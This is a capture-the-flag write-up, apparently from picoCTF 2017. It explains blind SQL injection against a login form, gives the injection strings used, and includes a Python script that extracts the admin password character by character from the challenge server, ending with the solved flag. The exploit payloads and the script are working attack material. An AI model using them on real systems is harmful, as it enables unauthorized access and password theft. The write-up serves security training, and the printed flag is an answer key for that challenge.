This problem involves SQL injection. The website has a login form with two fields: username and password. We want to get the admin's password so, we know there is a username called 'admin'. If we try a random password we get ```Incorrect Password.``` If the query is wrongly made, the page shows us: ```select * from users where pass = ' ... ``` letting us know the table's name, the column's name and the type of query done. With a simple query of the form ``` ' or 1=1; -- ' ``` we get the following message:
```
Login Functionality Not Complete. Flag is 63 characters
```

So this message is interesting. It is telling us that the flag will have 63 characters, but it didn't give us a any kind of error. It just said that the login functionality is not complete. So maybe, we can get the server to tell us if the password is correct by trying character by character. The idea is, if the query is correct we get the above message. If the query is wrong we get the incorrect password message. 

By trying the query:
```
' or 1=1 and pass like 'a%'; -- 
```
We can actually test every character of the admin's password. To do this automatically, I wrote a script in Python:
```python
import requests
import string

chars = string.printable.replace("%", "")

flag = ''

while len(flag) != 63:
    for c in chars:
        r = requests.post('http://shell2017.picoctf.com:40788/',
        	data={'username':'admin', 'password': "' or 1=1 and pass like '" + flag+c+"%';-- "}).text
        if 'Login Functionality Not Complete. Flag is 63 characters' in r:
            flag = flag + c
            print (flag)
            break

```

After a couple of minutes the admin's password is discovered, and we have our flag:
```
not_all_errors_should_be_shown_faa8380e951439eebb3d452b5e86f3f9
```
